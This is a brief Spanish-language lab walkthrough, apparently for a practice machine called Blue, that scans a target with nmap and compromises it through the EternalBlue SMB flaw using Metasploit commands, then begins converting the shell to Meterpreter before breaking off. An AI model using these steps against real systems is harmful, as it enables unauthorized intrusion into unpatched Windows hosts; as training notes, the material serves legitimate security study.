
# 1. Reconocimiento

Hacemos un `sudo nmap -p- -sVC -sC -sS --open -vvv -n -Pn 10.10149.61 -oN escaneoBlue`.

Encontramos 9 puertos abiertos, 3 de ellos por debajo del 1000.

Esta máquina es vulnerable a [[EternalBlue]], que está corriendo por el puerto 445.

# 2. Ganando acceso

1. Iniciamos Metasploit:

> `msfconsole`

2. Buscamos un sploit que nos sirva:

> `search eternalblue`

Y cogeremos el del path: `exploit/windows/smb/ms17_010_eternalblue`.

Hacemos `use exploit/windows/smb/ms17_010_eternalblue` y `show options`... Nos falta el RHOSTS, que es el que tenemos que poner: `set rhots ip`.

Vamos bien, pero por el bien de aprender, vamos a cambiar el payload a uno con una shell, en vez del meterpreter.

3. Lo corremos:

> `run`

# 3. Escalando privilegios

1. Convertimos nuestra shell (normal) a una meterpreter:

> `use post/multi/manage/shell_to_meterpreter`

2. 

